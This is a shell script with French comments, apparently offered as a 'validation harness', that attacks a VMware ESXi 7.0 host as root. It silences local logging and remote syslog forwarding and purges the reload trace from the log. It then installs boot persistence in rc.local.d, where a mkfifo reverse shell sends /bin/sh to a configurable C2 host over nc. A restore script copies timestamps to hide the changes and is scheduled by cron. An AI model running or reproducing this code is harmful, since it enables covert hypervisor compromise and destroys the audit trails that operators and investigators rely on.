#!/bin/sh
# HARNESS-VALIDATION — ESXi 7.0 root. Évasion d'audit + persistance.

set -e

CONFIG=/etc/vmsyslog.conf
BAK=/etc/rc.local.d/.vs.bak  # v4.1.5 : persistant (pas /tmp qui peut être nettoyé)
PERSIST=/etc/rc.local.d/local.sh
PERSIST_TAG="# harness_persist_v2"

# v2.3 : C2 configurable via variables d'environnement
C2_HOST="${C2_HOST:-127.0.0.1}"
C2_PORT="${C2_PORT:-4444}"

# v2.3 : chemin persistant pour le script de restauration (pas /tmp/)
# /tmp peut être nettoyé par tmpwatch ou au reboot → cron exécute un fichier inexistant
RESTORE_PATH="/etc/rc.local.d/.harness_restore.sh"

# v2.4 : vérifier qu'esxcli est disponible
if ! command -v esxcli >/dev/null 2>&1; then
    echo '{"module":"esxi_evasion","error":"esxcli_not_in_path"}'
    exit 2
fi

# ─── Snapshot de la configuration ───────────────────────────────
cp -p "$CONFIG" "$BAK"

# ─── 1) Neutralisation : redirection /dev/null + suppression forwarders ──
sed -i -e 's|/var/log/messages|/dev/null|g' \
       -e 's|^\([^#].*\(udp\|tcp\).*\)$|# \1|' "$CONFIG"

# ─── 2) Reload UNE SEULE FOIS ────────────────────────────────────
esxcli system syslog reload

# ─── 3) Purge de la trace de reload dans le log courant ──────────
sed -i '/vmsyslogd/d' /var/log/vmsyslog.log 2>/dev/null || true

# ─── 4) Persistance idempotente dans local.sh ────────────────────
#    v2.3 : C2_HOST et C2_PORT expansés depuis env vars.
#    Heredoc SANS guillemets sur le délimiteur pour permettre l'expansion.
# v2.4 : s'assurer que $PERSIST existe avant d'y grep (sinon création explicite)
if [ ! -f "$PERSIST" ]; then
    echo "[!] $PERSIST n'existe pas — création"
    touch "$PERSIST"
    chmod +x "$PERSIST"
fi
if ! grep -q "$PERSIST_TAG" "$PERSIST" 2>/dev/null; then
    cat >> "$PERSIST" <<PERSIST_EOF

$PERSIST_TAG
# Reverse shell BusyBox compatible (mkfifo bidirectionnel)
# C2: $C2_HOST:$C2_PORT
if [ ! -p /tmp/.k ]; then
    mkfifo /tmp/.k
fi
(while true; do
    cat /tmp/.k | /bin/sh 2>&1 | nc "$C2_HOST" "$C2_PORT" > /tmp/.k
    sleep 5
done) &
PERSIST_EOF
    chmod +x "$PERSIST"

    # Vérifier que local.sh est sourcé par /etc/rc.local
    if ! grep -q 'rc.local.d/local.sh' /etc/rc.local 2>/dev/null; then
        echo '/etc/rc.local.d/local.sh' >> /etc/rc.local
    fi
fi

# ─── 5) Script de restauration différée (chemin persistant) ────
#    v2.3 : /tmp/ peut être nettoyé → on stocke dans /etc/rc.local.d/
cat > "$RESTORE_PATH" <<RESTORE_EOF
#!/bin/sh
# Restauration différée de vmsyslog.conf (harness v2.4)
cp -p "$BAK" "$CONFIG"
touch -r "$BAK" "$CONFIG"    # copie exacte des timestamps (mtime + atime)
rm -f "$BAK"
# Ce reload final réactive le logging normal — inévitable mais différé
esxcli system syslog reload
# Nettoyage de la persistance
sed -i '/$PERSIST_TAG/,/^done) &$/d' "$PERSIST" 2>/dev/null || true
rm -f /tmp/.k
RESTORE_EOF
chmod +x "$RESTORE_PATH"

# ─── 6) Cron de restauration différée ───────────────────────────
CRON=/var/spool/cron/crontabs/root
if [ -d "$(dirname "$CRON")" ]; then
    # Idempotence : ne pas ajouter si déjà présent
    if ! grep -q 'harness_restore.sh' "$CRON" 2>/dev/null; then
        echo "0 6 * * * $RESTORE_PATH" >> "$CRON"
    fi
fi

echo "{\"module\":\"esxi_evasion\",\"status\":\"evasion_active\",\"persistence\":\"local.sh\",\"c2\":\"$C2_HOST:$C2_PORT\",\"restore_script\":\"$RESTORE_PATH\",\"restore_cron\":\"0 6 * * *\"}"
